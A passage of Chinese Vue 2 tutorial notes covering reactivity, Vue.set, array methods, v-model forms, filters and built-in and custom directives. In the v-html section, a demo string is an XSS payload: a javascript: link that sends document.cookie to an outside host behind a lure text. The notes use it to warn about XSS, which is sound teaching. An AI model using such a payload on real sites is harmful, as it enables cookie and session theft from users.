		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
                        // 写在计算属性中的任意一个属性发生了改变都会导致重新计算
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```



### vue 监测数据改变的原理

运行下面代码，会发现点击按钮后页面上的数据并没有发生改变，原因是：vue 并没有监测到此处的数据改变

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>更新时的一个问题</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<button @click="updateMei">更新马冬梅的信息</button>
			<ul>
				<li v-for="p of persons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			const vm = new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				methods: {
					updateMei(){
						// this.persons[0].name = '马老师' //奏效
						// this.persons[0].age = 50 //奏效
						// this.persons[0].sex = '男' //奏效
                        
                        // 检测不到
						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                        // 可以监测到
						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
					}
				}
			}) 

		</script>
</html>
```



vue 中数据代理的第一步是对 data 里的内容进行加工，做数据劫持，将具体的内容变成了一个 getter 和 setter，然后再转存到 _data 中。

加工的目的是为了做响应式！如：当 name 改变后，会调用 setter，setter 中调用了函数可以重新进行 vue 模板解析，以此达到更新页面的需求。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302051658574.png" alt="image-20230205165801370" style="zoom: 50%;" />

==所以 vue 检测数据改变所依靠的就是 setter！==



所以对于一开始在创建 Vue 实例对象 vm 的时候没有添加的属性，后期使用如控制台添加的时候（如：vm._data.sex=‘男’等），这个属性并没有相对应的 getter 和 setter，所以这个数据并不是响应式的数据，所以页面上相对应的数据就不会发生改变和更新。

此方法可以使用 vue 提供的 API 解决！

1. Vue.set() 方法（全局 API）：https://v2.cn.vuejs.org/v2/api/?#Vue-set
	1. [Vue.set( target, propertyName/index, value )](https://v2.cn.vuejs.org/v2/api/?#Vue-set)
	2. 参数：
		- `{Object | Array} target`
		- `{string | number} propertyName/index`
		- `{any} value`
	3. 返回值：设置的值
	4. 用法
		1. 向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `this.myObject.newProperty = 'hi'`)

> 注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。即：target 不能写 vm 或是 vm.xxx（普通属性），必须是一个 vm 中的 data 中的 对象属性才可以！



2. vm.$set() 方法（实例方法）：https://v2.cn.vuejs.org/v2/api/?#vm-set
	1. 参数：
		- [vm.$set( target, propertyName/index, value )](https://v2.cn.vuejs.org/v2/api/?#vm-set)
		- `{Object | Array} target`
		- `{string | number} propertyName/index`
		- `{any} value`

	2. 返回值：设置的值。
	3. 用法：是全局 `Vue.set` 的别名。


```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```





### 数组更新检测

#### 变更方法

==Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。==这些被包裹过的方法包括：

- push()
- pop()
- shift()
- unshift()
- splice()
- sort()
- reverse()

这些方法都是经过 vue 包装过的，可以用来对 data 中的数组进行更新的方法。但是不是原 JS 上的原有方法。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302061515566.png" alt="image-20230206151514381" style="zoom:67%;" />

```js
this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
```

当然，使用 Vue.set() 方法也可以实现上述代码功能。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302061525504.png" alt="image-20230206152508413" style="zoom:67%;" />

#### 替换数组

变更方法，顾名思义，会变更调用了这些方法的原始数组。相比之下，也有非变更方法，例如 `filter()`、`concat()` 和 `slice()`。它们不会变更原始数组，而**总是返回一个新数组**。当使用非变更方法时，可以用新数组替换旧数组：

```js
example1.items = example1.items.filter(function (item) {
  return item.message.match(/Foo/)
})
```



### 总结

数据劫持：就是指 data 中的属性值变化时被 setter 劫持进行更新页面和正常修改等一系列的操作。

Vue监视数据的原理：

​        1. vue会监视data中所有层次的数据。

​        2. 如何监测对象中的数据？

​                通过setter实现监视，且要在new Vue时就传入要监测的数据。

​                  (1).对象中后追加的属性，Vue默认不做响应式处理

​                  (2).如需给后添加的属性做响应式，请使用如下API：

​                          Vue.set(target，propertyName/index，value) 或  vm.$set(target，propertyName/index，value)

​        3. 如何监测数组中的数据？

​                  通过包裹数组更新元素的方法实现，本质就是做了两件事：

​                    (1).调用原生对应的方法对数组进行更新。

​                    (2).重新解析模板，进而更新页面。

​        4.在Vue修改数组中的某个元素一定要用如下方法：

​              1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()

​              2.Vue.set() 或 vm.$set()

​        特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```



## 表单输入绑定

https://v2.cn.vuejs.org/v2/guide/forms.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95

### 基本用法

你可以用 `v-model` 指令在表单 `<input>`、`<textarea>` 及 `<select>` 元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 `v-model` 本质上不过是语法糖。它负责监听用户的输入事件以更新数据，并对一些极端场景进行一些特殊处理。

> `v-model` 会忽略所有表单元素的 `value`、`checked`、`selected` attribute 的初始值而总是将 Vue 实例的数据作为数据来源。你应该通过 JavaScript 在组件的 `data` 选项中声明初始值。



`v-model` 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：

- text 和 textarea 元素使用 `value` property 和 `input` 事件；
- checkbox 和 radio 使用 `checked` property 和 `change` 事件；
- select 字段将 `value` 作为 prop 并将 `change` 作为事件。

> 对于需要使用[输入法](https://zh.wikipedia.org/wiki/输入法) (如中文、日文、韩文等) 的语言，你会发现 `v-model` 不会在输入法组合文字过程中得到更新。如果你也想处理这个过程，请使用 `input` 事件。



#### 文本

```html
<input v-model="message" placeholder="edit me">
<p>Message is: {{ message }}</p>
```



#### 多行文本

```html
<span>Multiline message is:</span>
<p style="white-space: pre-line;">{{ message }}</p>
<br>
<textarea v-model="message" placeholder="add multiple lines"></textarea>
```

> 在文本区域插值 (`<textarea>{{text}}</textarea>`) 并不会生效，应用 `v-model` 来代替。



#### 复选框

单个复选框，绑定到布尔值（接收使用字符串形式接收即可）：

```html
<input type="checkbox" id="checkbox" v-model="checked">
<label for="checkbox">{{ checked }}</label>
```

多个复选框，绑定到同一个数组（接收使用数组形式）：

```html
<input type="checkbox" id="jack" value="Jack" v-model="checkedNames">
<label for="jack">Jack</label>
<input type="checkbox" id="john" value="John" v-model="checkedNames">
<label for="john">John</label>
<input type="checkbox" id="mike" value="Mike" v-model="checkedNames">
<label for="mike">Mike</label>
<br>
<span>Checked names: {{ checkedNames }}</span>
```

```js
new Vue({
  el: '...',
  data: {
    checkedNames: []
  }
})
```



#### 单选按钮

```html
<div id="example-4">
  <input type="radio" id="one" value="One" v-model="picked">
  <label for="one">One</label>
  <br>
  <input type="radio" id="two" value="Two" v-model="picked">
  <label for="two">Two</label>
  <br>
  <span>Picked: {{ picked }}</span>
</div>
```

```js
new Vue({
  el: '#example-4',
  data: {
    picked: ''
  }
})
```



#### 选择框

单选时：

```html
<div id="example-5">
  <select v-model="selected">
    <option disabled value="">请选择</option>
    <option>A</option>
    <option>B</option>
    <option>C</option>
  </select>
  <span>Selected: {{ selected }}</span>
</div>
```

```js
new Vue({
  el: '...',
  data: {
    selected: ''
  }
})
```

> 如果 `v-model` 表达式的初始值未能匹配任何选项，`<select>` 元素将被渲染为“未选中”状态。在 iOS 中，这会使用户无法选择第一个选项。因为这样的情况下，iOS 不会触发 change 事件。因此，更推荐像上面这样提供一个值为空的禁用选项。



多选时 (绑定到一个数组)：

```html
<div id="example-6">
  <select v-model="selected" multiple style="width: 50px;">
    <option>A</option>
    <option>B</option>
    <option>C</option>
  </select>
  <br>
  <span>Selected: {{ selected }}</span>
</div>
```

```js
new Vue({
  el: '#example-6',
  data: {
    selected: []
  }
})
```



用 `v-for` 渲染的动态选项：

```html
<select v-model="selected">
  <option v-for="option in options" v-bind:value="option.value">
    {{ option.text }}
  </option>
</select>
<span>Selected: {{ selected }}</span>
```

```js
new Vue({
  el: '...',
  data: {
    selected: 'A',
    options: [
      { text: 'One', value: 'A' },
      { text: 'Two', value: 'B' },
      { text: 'Three', value: 'C' }
    ]
  }
})
```



### 值绑定

对于单选按钮，复选框及选择框的选项，`v-model` 绑定的值通常是静态字符串 (对于复选框也可以是布尔值)：

```html
<!-- 当选中时，`picked` 为字符串 "a" -->
<input type="radio" v-model="picked" value="a">

<!-- `toggle` 为 true 或 false -->
<input type="checkbox" v-model="toggle">

<!-- 当选中第一个选项时，`selected` 为字符串 "abc" -->
<select v-model="selected">
  <option value="abc">ABC</option>
</select>
```

但是有时我们可能想把值绑定到 Vue 实例的一个动态 property 上，这时可以用 `v-bind` 实现，并且这个 property 的值可以不是字符串。



#### 复选框

```html
<input  type="checkbox"  v-model="toggle"  true-value="yes"  false-value="no">
```

```js
// 当选中时
vm.toggle === 'yes'
// 当没有选中时
vm.toggle === 'no'
```

> 这里的 `true-value` 和 `false-value` attribute 并不会影响输入控件的 `value` attribute，因为浏览器在提交表单时并不会包含未被选中的复选框。如果要确保表单中这两个值中的一个能够被提交，(即“yes”或“no”)，请换用单选按钮。



#### 单选按钮

```html
<input type="radio" v-model="pick" v-bind:value="a">
```

```js
// 当选中时
vm.pick === vm.a
```



#### 选择框的选项

```html
<select v-model="selected">
    <!-- 内联对象字面量 -->
  <option v-bind:value="{ number: 123 }">123</option>
</select>
```

```js
// 当选中时
typeof vm.selected // => 'object'
vm.selected.number // => 123
```



### 修饰符

#### .lazy

在默认情况下，`v-model` 在每次 `input` 事件触发后将输入框的值与数据进行同步 (除了[上述](https://v2.cn.vuejs.org/v2/guide/forms.html#vmodel-ime-tip)输入法组合文字时)。你可以添加 `lazy` 修饰符，从而转为在 `change` 事件_之后_进行同步：

```html
<!-- 在“change”时而非“input”时更新 -->
<input v-model.lazy="msg">
```



#### .number

如果想自动将用户的输入值转为数值类型，可以给 `v-model` 添加 `number` 修饰符：

```html
<input v-model.number="age" type="number">
```

这通常很有用，因为即使在 `type="number"` 时，HTML 输入元素的值也总会返回字符串。如果这个值无法被 `parseFloat()` 解析，则会返回原始的值。



#### .trim

如果要自动过滤用户输入的首尾空白字符，可以给 `v-model` 添加 `trim` 修饰符：

```html
<input v-model.trim="msg">
```



### 总结备注

收集表单数据：

​          若：\<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。

​          若：\<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

​          若：\<input type="checkbox"/>

​              1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）

​              2.配置input的value属性:

​                  (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）

​                  (2)v-model的初始值是数组，那么收集的的就是value组成的数组

​          备注：v-model的三个修饰符（==一般和 input 里面的 type 结合使用==）：

​                  lazy：失去焦点再收集数据

​                  number：输入字符串转为有效的数字

​                  trim：输入首尾空格过滤

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```



## 过滤器

Vue.js 允许你自定义过滤器，可被用于一些常见的文本格式化。过滤器可以用在两个地方：**双花括号插值和 `v-bind` 表达式** (后者从 2.1.0+ 开始支持)。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示：

```html
<!-- 在双花括号中 -->
{{ message | capitalize }}

<!-- 在 `v-bind` 中 -->
<div v-bind:id="rawId | formatId"></div>
```

你可以在一个组件的选项中定义本地的过滤器：

```js
filters: {
  capitalize: function (value) {
    if (!value) return ''
    value = value.toString()
    return value.charAt(0).toUpperCase() + value.slice(1)
  }
}
```

或者在创建 Vue 实例之前全局定义过滤器：

```js
Vue.filter('capitalize', function (value) {
  if (!value) return ''
  value = value.toString()
  return value.charAt(0).toUpperCase() + value.slice(1)
})

new Vue({
  // ...
})
```

==当全局过滤器和局部过滤器重名时，会采用局部过滤器。==

过滤器函数总接收表达式的值 (之前的操作链的结果) 作为第一个参数。在上述例子中，`capitalize` 过滤器函数将会收到 `message` 的值作为第一个参数。

过滤器可以串联：

```html
{{ message | filterA | filterB }}
```

在这个例子中，`filterA` 被定义为接收单个参数的过滤器函数，表达式 `message` 的值将作为参数传入到函数中。然后继续调用同样被定义为接收单个参数的过滤器函数 `filterB`，将 `filterA` 的结果传递到 `filterB` 中。

过滤器是 JavaScript 函数，因此可以接收参数：

```js
{{ message | filterA('arg1', arg2) }}
```

这里，`filterA` 被定义为接收三个参数的过滤器函数。==其中 `message` 的值作为第一个参数==，普通字符串 `'arg1'` 作为第二个参数，表达式 `arg2` 的值作为第三个参数。



#### 总结

过滤器：

​        定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

​        语法：

​            1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}

​            2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"

​        备注：

​            1.过滤器也可以接收额外参数、多个过滤器也可以串联，前面一个过滤器的返回值作为后一个过滤器的实参

​            2.并没有改变原本的数据, 是产生新的对应的数据

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```



## 内置指令

我们学过的指令：

​            v-bind  : 单向绑定解析表达式, 可简写为 :xxx

​            v-model : 双向数据绑定

​            v-for  : 遍历数组/对象/字符串

​            v-on   : 绑定事件监听, 可简写为@

​            v-if     : 条件渲染（动态控制节点是否存存在）

​            v-else  : 条件渲染（动态控制节点是否存存在）

​            v-show  : 条件渲染 (动态控制节点是否展示)

<a href='https://v2.cn.vuejs.org/v2/api/?#v-text'>官方文档</a>

### v-text

 v-text指令：

1. 作用：向其所在的节点中渲染文本内容。
2. 接收一个字符串
3. 更新元素的 `textContent`。如果要更新部分的 `textContent`，需要使用 `{{ Mustache }}` 插值。
4. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}（插值语法）则不会。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>   <!-- 该元素节点标签中间不能再写文本，因为v-text会将元素内的文本全部替换为 name -->
			<div v-text="str"></div>    <!-- 不行，相当于 innertext 的功能，不会解析标签 -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```



### v-html

1. 接收一个字符串 string
2. 详细说明：更新元素的 `innerHTML`。**注意：内容按普通 HTML 插入 - 不会作为 Vue 模板进行编译**。如果试图使用 `v-html` 组合模板，可以重新考虑是否通过使用组件来替代。
3. 作用：向指定节点中渲染包含html结构的内容。
4. 与插值语法的区别：
	1. v-html会替换掉节点中所有的内容，{{xx}}则不会。
	2. v-html可以识别html结构。
5. 注意点：
	1. 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 [XSS 攻击](https://en.wikipedia.org/wiki/Cross-site_scripting)。只在可信内容上使用 `v-html`，**永不**用在用户提交的内容上。
	2. 在[单文件组件](https://v2.cn.vuejs.org/v2/guide/single-file-components.html)里，`scoped` 的样式不会应用在 `v-html` 内部，因为那部分 HTML 没有被 Vue 的模板编译器处理。如果你希望针对 `v-html` 的内容设置带作用域的 CSS，你可以替换为 [CSS Modules](https://vue-loader.vuejs.org/en/features/css-modules.html) 或用一个额外的全局 `<style>` 元素手动设置类似 BEM 的作用域策略。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

安全性问题解释：

cookie的工作过程：

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302062343855.png" alt="image-20230206234339540" style="zoom: 50%;" />

浏览器之间的 cookie 不能相互读取使用

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302062348847.png" alt="image-20230206234810637" style="zoom:50%;" />

==使用浏览器插件 cookie editor 可以快速的导出所有的 cookie 以实现 xss 跨站脚本攻击。两个浏览器都要有这个插件才能实现。==

所以应该尽量避免使用这种语法，避免不法人员去修改字符串中的内容导致解析出的文本页面具有危害性：钓鱼网站等被 xss 盗取 cookie。



### v-cloak

这个指令保持在元素上直到关联实例结束编译。和 CSS 规则如 `[v-cloak] { display: none }` 一起用时，这个指令可以隐藏未编译的 Mustache 标签直到实例准备完毕。

注意：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
            /* 属性选择器，可以选出带有 v-cloak 属性的所有元素，在有 v-cloak 属性的情况下页面上是未解析的 vue 模板，所以将其隐藏，而  				  等到 vue 介入并解析后会删去 v-cloak 属性，所以也就会显示页面上的解析好的内容 */
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
        <!-- 服务器可以自己写一个延迟五秒发送 xxx.js 的服务器 -->
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```



### v-once

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```



### v-pre

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```



## 自定义指令

### 定义方式

自定义指令的方式可以有两种：

1. 对象形式：可以更好的处理细节上的内容，在不同的时间节点调用不同的处理函数：bind(){}、insert(){}、update(){}
2. 函数形式，更简单一些，但是细节处理上没有对象形式的好
3. 联系：函数形式相当于对象形式只写了 bind(){} 和 update(){}，因为这两个函数中的内容多数情况下都是相同的

```js
// 对象形式
directives: {
  big: {
    key1: value1,
    key2: value2,
    key3: value3,
   }
}
// 函数形式
directives: {
    big(){
        
    }
}
```



### 作用范围

1. 局部指令定义

	```js
	// 方法一
	new Vue({
		directives:(指令名 : 配置对象)
	});
	// 方法二
	new Vue({
		directives{指令名 : 回调函数}
	});
	```

2. 全局指令定义

	```js
	Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
	```



配置对象中常用的3个回调：
									(1).bind：指令与元素成功绑定时调用。
									(2).inserted：指令所在元素被插入页面时调用。
									(3).update：指令所在模板结构被重新解析时调用。

备注：
									1.指令定义时不加v-，但使用时要加v-；
									2.指令名如果是多个单词，要使用kebab-case（短横线命名法）命名方式，不要用camelCase（驼峰命名法）命名。

